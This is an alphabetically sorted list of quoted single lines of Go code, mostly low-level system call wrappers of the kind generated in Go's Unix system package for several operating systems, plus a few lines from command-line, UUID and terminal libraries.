"_, _, e1 := syscall_rawsyscall(SYS_KILL, uintptr(pid), uintptr(sig), 0)"
"_, _, e1 := syscall_rawsyscall(SYS_PIPE, uintptr(unsafe.Pointer(p)), 0, 0)"
"_, _, e1 := syscall_rawsyscall(SYS_SETGROUPS, uintptr(n), uintptr(unsafe.Pointer(list)), 0)"
"_, _, e1 := syscall_rawsyscall(SYS_SETPGID, uintptr(pid), uintptr(pgid), 0)"
"_, _, e1 := syscall_rawsyscall(SYS_SETREGID, uintptr(rgid), uintptr(egid), 0)"
"_, _, e1 := syscall_rawsyscall(SYS_SETREUID, uintptr(ruid), uintptr(euid), 0)"
"_, _, e1 := syscall_rawsyscall(SYS_SETRLIMIT, uintptr(resource), uintptr(unsafe.Pointer(lim)), 0)"
"_, _, e1 := syscall_rawsyscall(SYS___GETPEERNAME_A, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"_, _, e1 := syscall_rawsyscall(SYS___GETSOCKNAME_A, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"_, _, e1 := syscall_rawsyscall(SYS___UNAME_A, uintptr(unsafe.Pointer(buf)), 0, 0)"
"_, _, e1 := syscall_rawsyscall6(SYS_SOCKETPAIR, uintptr(domain), uintptr(typ), uintptr(proto), uintptr(unsafe.Pointer(fd)), 0, 0)"
"_, _, e1 := syscall_syscall(SYS_CLOSE, uintptr(fd), 0, 0)"
"_, _, e1 := syscall_syscall(SYS_DUP2, uintptr(oldfd), uintptr(newfd), 0)"
"_, _, e1 := syscall_syscall(SYS_FCHDIR, uintptr(fd), 0, 0)"
"_, _, e1 := syscall_syscall(SYS_FCHMOD, uintptr(fd), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(SYS_FCHOWN, uintptr(fd), uintptr(uid), uintptr(gid))"
"_, _, e1 := syscall_syscall(SYS_FSTAT, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(SYS_FSTATVFS, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(SYS_FSYNC, uintptr(fd), 0, 0)"
"_, _, e1 := syscall_syscall(SYS_FTRUNCATE, uintptr(fd), uintptr(length), 0)"
"_, _, e1 := syscall_syscall(SYS_IOCTL, uintptr(fd), uintptr(req), uintptr(arg))"
"_, _, e1 := syscall_syscall(SYS_LISTEN, uintptr(s), uintptr(n), 0)"
"_, _, e1 := syscall_syscall(SYS_MPROTECT, uintptr(_p0), uintptr(len(b)), uintptr(prot))"
"_, _, e1 := syscall_syscall(SYS_MSYNC, uintptr(_p0), uintptr(len(b)), uintptr(flags))"
"_, _, e1 := syscall_syscall(SYS_MUNMAP, uintptr(addr), uintptr(length), 0)"
"_, _, e1 := syscall_syscall(SYS_REMOVE, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(SYS_SETGID, uintptr(uid), 0, 0)"
"_, _, e1 := syscall_syscall(SYS_SETPRIORITY, uintptr(which), uintptr(who), uintptr(prio))"
"_, _, e1 := syscall_syscall(SYS_SETUID, uintptr(uid), 0, 0)"
"_, _, e1 := syscall_syscall(SYS_SHUTDOWN, uintptr(fd), uintptr(how), 0)"
"_, _, e1 := syscall_syscall(SYS_TCGETATTR, uintptr(fildes), uintptr(unsafe.Pointer(termptr)), 0)"
"_, _, e1 := syscall_syscall(SYS_TCSETATTR, uintptr(fildes), uintptr(when), uintptr(unsafe.Pointer(termptr)))"
"_, _, e1 := syscall_syscall(SYS___ACCESS_A, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(SYS___BIND_A, uintptr(s), uintptr(addr), uintptr(addrlen))"
"_, _, e1 := syscall_syscall(SYS___CHDIR_A, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(SYS___CHMOD_A, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(SYS___CHOWN_A, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid))"
"_, _, e1 := syscall_syscall(SYS___CHROOT_A, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(SYS___CONNECT_A, uintptr(s), uintptr(addr), uintptr(addrlen))"
"_, _, e1 := syscall_syscall(SYS___GETHOSTNAME_A, uintptr(_p0), uintptr(len(buf)), 0)"
"_, _, e1 := syscall_syscall(SYS___LCHOWN_A, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid))"
"_, _, e1 := syscall_syscall(SYS___LINK_A, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := syscall_syscall(SYS___LSTAT_A, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(SYS___MKDIR_A, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(SYS___MKFIFO_A, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(SYS___MKNOD_A, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev))"
"_, _, e1 := syscall_syscall(SYS___MLOCKALL, _BPX_NONSWAP, 0, 0)"
"_, _, e1 := syscall_syscall(SYS___MLOCKALL, _BPX_SWAP, 0, 0)"
"_, _, e1 := syscall_syscall(SYS___RENAME_A, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := syscall_syscall(SYS___RMDIR_A, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(SYS___STAT_A, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(statLE)), 0)"
"_, _, e1 := syscall_syscall(SYS___SYMLINK_A, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := syscall_syscall(SYS___TRUNCATE_A, uintptr(unsafe.Pointer(_p0)), uintptr(length), 0)"
"_, _, e1 := syscall_syscall(SYS___UMOUNT_A, uintptr(unsafe.Pointer(_p0)), uintptr(mtm), 0)"
"_, _, e1 := syscall_syscall(SYS___UNLINK_A, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(SYS___UTIMES_A, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(timeval)), 0)"
"_, _, e1 := syscall_syscall(SYS___UTIME_A, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(utim)), 0)"
"_, _, e1 := syscall_syscall(libc_access_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(libc_adjtime_trampoline_addr, uintptr(unsafe.Pointer(delta)), uintptr(unsafe.Pointer(olddelta)), 0)"
"_, _, e1 := syscall_syscall(libc_bind_trampoline_addr, uintptr(s), uintptr(addr), uintptr(addrlen))"
"_, _, e1 := syscall_syscall(libc_chdir_trampoline_addr, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(libc_chflags_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"_, _, e1 := syscall_syscall(libc_chmod_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(libc_chown_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid))"
"_, _, e1 := syscall_syscall(libc_chroot_trampoline_addr, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(libc_clock_gettime_trampoline_addr, uintptr(clockid), uintptr(unsafe.Pointer(time)), 0)"
"_, _, e1 := syscall_syscall(libc_clonefile_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(flags))"
"_, _, e1 := syscall_syscall(libc_close_trampoline_addr, uintptr(fd), 0, 0)"
"_, _, e1 := syscall_syscall(libc_closedir_trampoline_addr, uintptr(dir), 0, 0)"
"_, _, e1 := syscall_syscall(libc_connect_trampoline_addr, uintptr(s), uintptr(addr), uintptr(addrlen))"
"_, _, e1 := syscall_syscall(libc_dup2_trampoline_addr, uintptr(from), uintptr(to), 0)"
"_, _, e1 := syscall_syscall(libc_exchangedata_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(options))"
"_, _, e1 := syscall_syscall(libc_fchdir_trampoline_addr, uintptr(fd), 0, 0)"
"_, _, e1 := syscall_syscall(libc_fchflags_trampoline_addr, uintptr(fd), uintptr(flags), 0)"
"_, _, e1 := syscall_syscall(libc_fchmod_trampoline_addr, uintptr(fd), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(libc_fchown_trampoline_addr, uintptr(fd), uintptr(uid), uintptr(gid))"
"_, _, e1 := syscall_syscall(libc_flock_trampoline_addr, uintptr(fd), uintptr(how), 0)"
"_, _, e1 := syscall_syscall(libc_fremovexattr_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(options))"
"_, _, e1 := syscall_syscall(libc_fstat64_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_fstat_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_fstatfs64_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_fstatfs_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_fsync_trampoline_addr, uintptr(fd), 0, 0)"
"_, _, e1 := syscall_syscall(libc_ftruncate_trampoline_addr, uintptr(fd), uintptr(length), 0)"
"_, _, e1 := syscall_syscall(libc_futimes_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(timeval)), 0)"
"_, _, e1 := syscall_syscall(libc_ioctl_trampoline_addr, uintptr(fd), uintptr(req), uintptr(arg))"
"_, _, e1 := syscall_syscall(libc_kill_trampoline_addr, uintptr(pid), uintptr(signum), uintptr(posix))"
"_, _, e1 := syscall_syscall(libc_lchown_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid))"
"_, _, e1 := syscall_syscall(libc_link_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := syscall_syscall(libc_listen_trampoline_addr, uintptr(s), uintptr(backlog), 0)"
"_, _, e1 := syscall_syscall(libc_lstat64_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_lstat_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_madvise_trampoline_addr, uintptr(_p0), uintptr(len(b)), uintptr(behav))"
"_, _, e1 := syscall_syscall(libc_mkdir_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(libc_mkdirat_trampoline_addr, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode))"
"_, _, e1 := syscall_syscall(libc_mkfifo_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"_, _, e1 := syscall_syscall(libc_mknod_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(dev))"
"_, _, e1 := syscall_syscall(libc_mlock_trampoline_addr, uintptr(_p0), uintptr(len(b)), 0)"
"_, _, e1 := syscall_syscall(libc_mlockall_trampoline_addr, uintptr(flags), 0, 0)"
"_, _, e1 := syscall_syscall(libc_mprotect_trampoline_addr, uintptr(_p0), uintptr(len(b)), uintptr(prot))"
"_, _, e1 := syscall_syscall(libc_msync_trampoline_addr, uintptr(_p0), uintptr(len(b)), uintptr(flags))"
"_, _, e1 := syscall_syscall(libc_munlock_trampoline_addr, uintptr(_p0), uintptr(len(b)), 0)"
"_, _, e1 := syscall_syscall(libc_munlockall_trampoline_addr, 0, 0, 0)"
"_, _, e1 := syscall_syscall(libc_munmap_trampoline_addr, uintptr(addr), uintptr(length), 0)"
"_, _, e1 := syscall_syscall(libc_removexattr_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(options))"
"_, _, e1 := syscall_syscall(libc_rename_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := syscall_syscall(libc_revoke_trampoline_addr, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(libc_rmdir_trampoline_addr, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(libc_setegid_trampoline_addr, uintptr(egid), 0, 0)"
"_, _, e1 := syscall_syscall(libc_setlogin_trampoline_addr, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(libc_setpriority_trampoline_addr, uintptr(which), uintptr(who), uintptr(prio))"
"_, _, e1 := syscall_syscall(libc_setprivexec_trampoline_addr, uintptr(flag), 0, 0)"
"_, _, e1 := syscall_syscall(libc_shmdt_trampoline_addr, uintptr(addr), 0, 0)"
"_, _, e1 := syscall_syscall(libc_shutdown_trampoline_addr, uintptr(s), uintptr(how), 0)"
"_, _, e1 := syscall_syscall(libc_stat64_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_stat_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_statfs64_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_statfs_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), 0)"
"_, _, e1 := syscall_syscall(libc_symlink_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), 0)"
"_, _, e1 := syscall_syscall(libc_symlinkat_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(newdirfd), uintptr(unsafe.Pointer(_p1)))"
"_, _, e1 := syscall_syscall(libc_sync_trampoline_addr, 0, 0, 0)"
"_, _, e1 := syscall_syscall(libc_truncate_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(length), 0)"
"_, _, e1 := syscall_syscall(libc_undelete_trampoline_addr, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(libc_unlink_trampoline_addr, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"_, _, e1 := syscall_syscall(libc_unlinkat_trampoline_addr, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags))"
"_, _, e1 := syscall_syscall(libc_unmount_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"_, _, e1 := syscall_syscall(libc_utimes_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(timeval)), 0)"
"_, _, e1 := syscall_syscall6(SYS_GETSOCKOPT, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(unsafe.Pointer(vallen)), 0)"
"_, _, e1 := syscall_syscall6(SYS_SETSOCKOPT, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(vallen), 0)"
"_, _, e1 := syscall_syscall6(SYS___MOUNT_A, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(unsafe.Pointer(_p2)), uintptr(mtm), uintptr(parmlen), uintptr(unsafe.Pointer(_p3)))"
"_, _, e1 := syscall_syscall6(SYS___SENDTO_A, uintptr(s), uintptr(_p0), uintptr(len(buf)), uintptr(flags), uintptr(to), uintptr(addrlen))"
"_, _, e1 := syscall_syscall6(libc_clonefileat_trampoline_addr, uintptr(srcDirfd), uintptr(unsafe.Pointer(_p0)), uintptr(dstDirfd), uintptr(unsafe.Pointer(_p1)), uintptr(flags), 0)"
"_, _, e1 := syscall_syscall6(libc_faccessat_trampoline_addr, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(flags), 0, 0)"
"_, _, e1 := syscall_syscall6(libc_fchmodat_trampoline_addr, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(flags), 0, 0)"
"_, _, e1 := syscall_syscall6(libc_fchownat_trampoline_addr, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(uid), uintptr(gid), uintptr(flags), 0)"
"_, _, e1 := syscall_syscall6(libc_fclonefileat_trampoline_addr, uintptr(srcDirfd), uintptr(dstDirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0, 0)"
"_, _, e1 := syscall_syscall6(libc_fsetxattr_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(data)), uintptr(size), uintptr(position), uintptr(options))"
"_, _, e1 := syscall_syscall6(libc_fstatat64_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), uintptr(flags), 0, 0)"
"_, _, e1 := syscall_syscall6(libc_fstatat_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), uintptr(flags), 0, 0)"
"_, _, e1 := syscall_syscall6(libc_getsockopt_trampoline_addr, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(unsafe.Pointer(vallen)), 0)"
"_, _, e1 := syscall_syscall6(libc_linkat_trampoline_addr, uintptr(pathfd), uintptr(unsafe.Pointer(_p0)), uintptr(linkfd), uintptr(unsafe.Pointer(_p1)), uintptr(flags), 0)"
"_, _, e1 := syscall_syscall6(libc_mount_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(flags), uintptr(data), 0, 0)"
"_, _, e1 := syscall_syscall6(libc_ptrace_trampoline_addr, uintptr(request), uintptr(pid), uintptr(addr), uintptr(data), 0, 0)"
"_, _, e1 := syscall_syscall6(libc_renameat_trampoline_addr, uintptr(fromfd), uintptr(unsafe.Pointer(_p0)), uintptr(tofd), uintptr(unsafe.Pointer(_p1)), 0, 0)"
"_, _, e1 := syscall_syscall6(libc_sendfile_trampoline_addr, uintptr(infd), uintptr(outfd), uintptr(offset), uintptr(unsafe.Pointer(len)), uintptr(hdtr), uintptr(flags))"
"_, _, e1 := syscall_syscall6(libc_sendto_trampoline_addr, uintptr(s), uintptr(_p0), uintptr(len(buf)), uintptr(flags), uintptr(to), uintptr(addrlen))"
"_, _, e1 := syscall_syscall6(libc_setsockopt_trampoline_addr, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(vallen), 0)"
"_, _, e1 := syscall_syscall6(libc_setxattr_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(unsafe.Pointer(data)), uintptr(size), uintptr(position), uintptr(options))"
"_, _, e1 := syscall_syscall6(libc_sysctl_trampoline_addr, uintptr(_p0), uintptr(len(mib)), uintptr(unsafe.Pointer(old)), uintptr(unsafe.Pointer(oldlen)), uintptr(unsafe.Pointer(new)), uintptr(newlen))"
"_, _, e1 := syscall_syscall6(libc_utimensat_trampoline_addr, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(times)), uintptr(flags), 0, 0)"
"_, _, e1 := sysvicall6(uintptr(unsafe.Pointer("
"_, _, e1 = syscall_syscall(SYS_CLOSE, uintptr(fd), 0, 0)"
"_, _, err := RawSyscall(SYS_SOCKETCALL, netGetPeerName, uintptr(unsafe.Pointer("
"_, _, err := RawSyscall(SYS_SOCKETCALL, netGetSockName, uintptr(unsafe.Pointer("
"_, _, err := RawSyscall(SYS_SOCKETCALL, netSocketPair, uintptr(unsafe.Pointer("
"_, _, err := Syscall(SYS_SOCKETCALL, netBind, uintptr(unsafe.Pointer("
"_, _, err := Syscall(SYS_SOCKETCALL, netConnect, uintptr(unsafe.Pointer("
"_, _, err := Syscall(SYS_SOCKETCALL, netGetSockOpt, uintptr(unsafe.Pointer("
"_, _, err := Syscall(SYS_SOCKETCALL, netListen, uintptr(unsafe.Pointer("
"_, _, err := Syscall(SYS_SOCKETCALL, netSendTo, uintptr(unsafe.Pointer("
"_, _, err := Syscall(SYS_SOCKETCALL, netSetSockOpt, uintptr(unsafe.Pointer("
"_, _, err := Syscall(SYS_SOCKETCALL, netShutdown, uintptr(unsafe.Pointer("
"_, _, err := Syscall6(SYS__LLSEEK, uintptr(fd), uintptr(offsetHigh), uintptr(offsetLow), uintptr(unsafe.Pointer("
"_, _, errno := Syscall(SYS_SYSLOG, uintptr(typ), uintptr(p), uintptr(arg))"
"_, _, errno := Syscall(fcntl64Syscall, fd, uintptr(cmd), uintptr(unsafe.Pointer(lk)))"
"_, _, errno := syscall_syscall(SYS_FCNTL, fd, uintptr(cmd), uintptr(unsafe.Pointer("
"_, alreadyThere := f.formal[normalizedFlagName]"
"_, e := rawsocketcall(_GETPEERNAME, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), 0, 0, 0)"
"_, e := rawsocketcall(_GETSOCKNAME, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), 0, 0, 0)"
"_, e := rawsocketcall(_SOCKETPAIR, uintptr(domain), uintptr(typ), uintptr(flags), uintptr(unsafe.Pointer(fd)), 0, 0)"
"_, e := socketcall(_BIND, uintptr(s), uintptr(addr), uintptr(addrlen), 0, 0, 0)"
"_, e := socketcall(_CONNECT, uintptr(s), uintptr(addr), uintptr(addrlen), 0, 0, 0)"
"_, e := socketcall(_GETSOCKOPT, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(unsafe.Pointer(vallen)), 0)"
"_, e := socketcall(_LISTEN, uintptr(s), uintptr(n), 0, 0, 0, 0)"
"_, e := socketcall(_SENDTO, uintptr(s), base, uintptr(len(p)), uintptr(flags), uintptr(to), uintptr(addrlen))"
"_, e := socketcall(_SETSOCKOPT, uintptr(s), uintptr(level), uintptr(name), uintptr(val), vallen, 0)"
"_, e := socketcall(_SHUTDOWN, uintptr(s), uintptr(how), 0, 0, 0, 0)"
"_, e = Seek(fd, length, 0)"
"_, e1 := callacct(uintptr(unsafe.Pointer(_p0)))"
"_, e1 := callbind(s, uintptr(addr), uintptr(addrlen))"
"_, e1 := callchdir(uintptr(unsafe.Pointer(_p0)))"
"_, e1 := callchroot(uintptr(unsafe.Pointer(_p0)))"
"_, e1 := callclose(fd)"
"_, e1 := callconnect(s, uintptr(addr), uintptr(addrlen))"
"_, e1 := calldup2(oldfd, newfd)"
"_, e1 := callfaccessat(dirfd, uintptr(unsafe.Pointer(_p0)), mode, flags)"
"_, e1 := callfchdir(fd)"
"_, e1 := callfchmod(fd, mode)"
"_, e1 := callfchmodat(dirfd, uintptr(unsafe.Pointer(_p0)), mode, flags)"
"_, e1 := callfchown(fd, uid, gid)"
"_, e1 := callfchownat(dirfd, uintptr(unsafe.Pointer(_p0)), uid, gid, flags)"
"_, e1 := callfcntl(fd, cmd, uintptr(unsafe.Pointer(lk)))"
"_, e1 := callfdatasync(fd)"
"_, e1 := callfstat(fd, uintptr(unsafe.Pointer(stat)))"
"_, e1 := callfstatat(dirfd, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)), flags)"
"_, e1 := callfstatfs(fd, uintptr(unsafe.Pointer(buf)))"
"_, e1 := callfsync_range(fd, how, start, length)"
"_, e1 := callftruncate(fd, length)"
"_, e1 := callgetcwd(uintptr(unsafe.Pointer(_p0)), len(buf))"
"_, e1 := callgetpeername(fd, uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"_, e1 := callgetrlimit(resource, uintptr(unsafe.Pointer(rlim)))"
"_, e1 := callgetrusage(who, uintptr(unsafe.Pointer(rusage)))"
"_, e1 := callgetsockname(fd, uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"_, e1 := callgetsockopt(s, level, name, uintptr(val), uintptr(unsafe.Pointer(vallen)))"
"_, e1 := callgettimeofday(uintptr(unsafe.Pointer(tv)), uintptr(unsafe.Pointer(tzp)))"
"_, e1 := callioctl(fd, int(req), arg)"
"_, e1 := callkill(pid, int(sig))"
"_, e1 := calllchown(uintptr(unsafe.Pointer(_p0)), uid, gid)"
"_, e1 := calllisten(s, n)"
"_, e1 := calllstat(uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(stat)))"
"_, e1 := callmadvise(uintptr(unsafe.Pointer(_p0)), len(b), advice)"
"_, e1 := callmkdir(dirfd, uintptr(unsafe.Pointer(_p0)), mode)"
"_, e1 := callmkdirat(dirfd, uintptr(unsafe.Pointer(_p0)), mode)"
"_, e1 := callmkfifo(uintptr(unsafe.Pointer(_p0)), mode)"
"_, e1 := callmknod(uintptr(unsafe.Pointer(_p0)), mode, dev)"
"_, e1 := callmknodat(dirfd, uintptr(unsafe.Pointer(_p0)), mode, dev)"
"_, e1 := callmlock(uintptr(unsafe.Pointer(_p0)), len(b))"
"_, e1 := callmlockall(flags)"
"_, e1 := callmprotect(uintptr(unsafe.Pointer(_p0)), len(b), prot)"
"_, e1 := callmsync(uintptr(unsafe.Pointer(_p0)), len(b), flags)"
"_, e1 := callmunlock(uintptr(unsafe.Pointer(_p0)), len(b))"
"_, e1 := callmunlockall()"
"_, e1 := callmunmap(addr, length)"
"_, e1 := callnanosleep(uintptr(unsafe.Pointer(time)), uintptr(unsafe.Pointer(leftover)))"
"_, e1 := callpause()"
"_, e1 := callpipe(uintptr(unsafe.Pointer(p)))"
"_, e1 := callposix_fadvise64(fd, offset, length, advice)"
"_, e1 := callrenameat(olddirfd, uintptr(unsafe.Pointer(_p0)), newdirfd, uintptr(unsafe.Pointer(_p1)))"
"_, e1 := callsendto(s, uintptr(unsafe.Pointer(_p0)), len(buf), flags, uintptr(to), uintptr(addrlen))"
"_, e1 := callsetdomainname(uintptr(unsafe.Pointer(_p0)), len(p))"
"_, e1 := callsetgid(uid)"
"_, e1 := callsetgroups(n, uintptr(unsafe.Pointer(list)))"
"_, e1 := callsethostname(uintptr(unsafe.Pointer(_p0)), len(p))"
"_, e1 := callsetpgid(pid, pgid)"
"_, e1 := callsetpriority(which, who, prio)"
"_, e1 := callsetregid(rgid, egid)"
"_, e1 := callsetreuid(ruid, euid)"
"_, e1 := callsetrlimit(resource, uintptr(unsafe.Pointer(rlim)))"
"_, e1 := callsetsockopt(s, level, name, uintptr(val), vallen)"
"_, e1 := callsettimeofday(uintptr(unsafe.Pointer(tv)))"
"_, e1 := callsetuid(uid)"
"_, e1 := callshutdown(fd, how)"
"_, e1 := callsocketpair(domain, typ, proto, uintptr(unsafe.Pointer(fd)))"
"_, e1 := callstat(uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(statptr)))"
"_, e1 := callstatfs(uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(buf)))"
"_, e1 := callstatx(dirfd, uintptr(unsafe.Pointer(_p0)), flags, mask, uintptr(unsafe.Pointer(stat)))"
"_, e1 := calltruncate(uintptr(unsafe.Pointer(_p0)), length)"
"_, e1 := callumount(uintptr(unsafe.Pointer(_p0)))"
"_, e1 := calluname(uintptr(unsafe.Pointer(buf)))"
"_, e1 := callunlink(uintptr(unsafe.Pointer(_p0)))"
"_, e1 := callunlinkat(dirfd, uintptr(unsafe.Pointer(_p0)), flags)"
"_, e1 := callustat(dev, uintptr(unsafe.Pointer(ubuf)))"
"_, e1 := callutime(uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(buf)))"
"_, e1 := callutimensat(dirfd, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(times)), flag)"
"_, e1 := callutimes(uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(times)))"
"_, err := Getcwd(buf[0:])"
"_, err := KeyctlInt(KEYCTL_SETPERM, id, int(perm), 0, 0)"
"_, err := SysvShmCtl(id, IPC_STAT, "
"_, err := Times("
"_, err := b.WriteString(s)"
"_, err := buf.WriteTo(w)"
"_, err := c.ExecuteC()"
"_, err := fcntl(int(fd), cmd, int(uintptr(unsafe.Pointer(fstore))))"
"_, err := fcntl(int(fd), cmd, int(uintptr(unsafe.Pointer(lk))))"
"_, err := io.ReadFull(r, uuid[:])"
"_, err := io.ReadFull(rander, pool[:])"
"_, err := isptmaster(f.Fd())"
"_, err := port_associate(e.port, PORT_SOURCE_FD, fd, events, ("
"_, err := port_dissociate(e.port, PORT_SOURCE_FD, fd)"
"_, err := port_dissociate(e.port, PORT_SOURCE_FILE, uintptr(unsafe.Pointer(f.fobj)))"
"_, err := port_get(e.port, pe, t)"
"_, err := port_getn(e.port, nil, 0, "
"_, err := ppoll(nil, 0, nil, nil)"
"_, err := setfsgid(gid)"
"_, err := setfsuid(uid)"
"_, err := t.c.Write(t.outBuf)"
"_, err := unix.IoctlGetTermios(fd, ioctlReadTermios)"
"_, err = ExtattrSetFd(fd, nsid, a, uintptr(d), datasiz)"
"_, err = ExtattrSetFile(file, nsid, a, uintptr(d), datasiz)"
"_, err = ExtattrSetLink(link, nsid, a, uintptr(d), datasiz)"
